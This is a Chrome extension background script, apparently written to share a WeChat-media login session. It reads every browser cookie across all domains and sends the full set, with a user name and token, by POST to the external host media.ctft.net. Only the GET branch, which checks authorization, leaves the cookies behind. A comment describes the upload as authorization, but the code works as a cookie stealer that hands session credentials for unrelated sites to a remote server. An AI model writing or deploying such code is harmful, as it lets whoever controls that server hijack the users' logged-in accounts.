
var content = "";
var user_name = ""

function getAll() {
    content = ""
    chrome.cookies.getAll({}, function (cookies) {
        if (!cookies || !cookies.length) {
            chrome.runtime.sendMessage({type: "send", code: -1, info: {msg: '当前页面没有cookie'}});
            return
        }
        for (var i in cookies) {
            if(cookies[i].name !== 'mm_lang') {
                content += cookies[i].name +'='+ cookies[i].value +';'
            }
            if (cookies[i].name === 'slave_user') {
                user_name = cookies[i].value
            }
        }
    })
}

chrome.runtime.onMessage.addListener(function(objRequest, _, sendResponse){
    var token = objRequest.token;
    getAll()
    setTimeout(() => {
        console.log(content)
        if (objRequest.cook === undefined) {
            var cookieslist = content
        } else {
            var cookieslist = content + objRequest.cook
        }
        console.log(cookieslist)
        // laserExtensionId 1 get请求是否受过权 2 post 授权
        if (objRequest.laserExtensionId === 1) {
            $.ajax({
                url: 'https://media.ctft.net/wx/checkcookie',
                type: 'GET',
                data: {'user_name': user_name,'token': token},
                dataType: 'text',
            }).then(function(response){
                console.log(response, 1)
                sendResponse(response);
            }, function(response){
                console.log(response, 2)
                sendResponse(response);
            });
        } else {
            $.ajax({
                url: 'https://media.ctft.net/wx/setcookie',
                type: 'POST',
                data: {'user_name': user_name,'token': token,'cookie':cookieslist},
                dataType: 'text',
            }).then(function(response){
                console.log(response, 1)
                sendResponse(response);
            }, function(response){
                console.log(response, 2)
                sendResponse(response);
            });
        }
    }, 10)
	return true;
});

